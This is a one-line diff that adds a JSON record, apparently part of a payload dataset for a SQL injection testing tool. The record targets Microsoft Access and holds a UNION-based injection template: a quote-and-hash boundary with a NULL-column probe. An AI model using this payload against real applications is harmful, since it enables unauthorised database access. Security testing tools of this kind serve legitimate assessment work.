@@ -1,0 +1,1 @@
+{"dbms": "access", "technique": "union", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} UNION ALL SELECT NULL,NULL,NULL,NULL", "comment": "access union: single+enc hash"}
